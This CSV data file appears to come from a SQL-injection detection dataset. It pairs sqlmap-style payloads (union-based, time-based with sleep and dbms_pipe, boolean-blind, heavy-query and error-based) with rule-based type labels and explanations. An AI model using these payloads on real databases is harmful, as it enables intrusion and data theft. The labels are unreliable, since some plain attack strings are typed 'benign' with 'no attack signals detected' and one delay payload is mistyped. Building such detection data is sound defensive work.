row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
11130,"1 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) -- cbsd",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
11131,1 ) where 2223 = 2223,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
11132,1' where 9416 = 9416,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
11133,-1459' ) ) ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( 'eiet' like 'eiet,1,,boolean_blind,firebird,0.95,") and (, like ' detected — boolean_blind injection (priority 8) on firebird",rule-based
11134,1'+ ( select somn where 8636 = 8636 rlike sleep ( 5 ) ) +',1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
11135,-3846%' or 6872 = 6872 and '%' = ',1,,boolean_blind,generic,0.95,6872 = 6872 and detected — boolean_blind injection (priority 8) on generic,rule-based
11136,"-4929"" where 6381 = 6381 or 8571 = 8571--",1,,boolean_blind,generic,0.95,6381 = 6381 or detected — boolean_blind injection (priority 8) on generic,rule-based
11137,1' ) where 1917 = 1917 union all select null#,1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
11138,"-9175' ) ) union all select 6174,6174,6174,6174--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
11139,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ""eboa"" like ""eboa",1,,boolean_blind,oracle,0.95,"like "" detected — boolean_blind injection (priority 8) on oracle",rule-based
11140,"1, ( select ( case when ( 5334 = 4976 ) then 1 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
11141,1' ) ) ) and ( 3020 = 3020 ) *6703 and ( ( ( 'qfxg' = 'qfxg,1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
11142,"1' and elt ( 9371 = 8882,8882 ) and 'vurh' = 'vurh",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
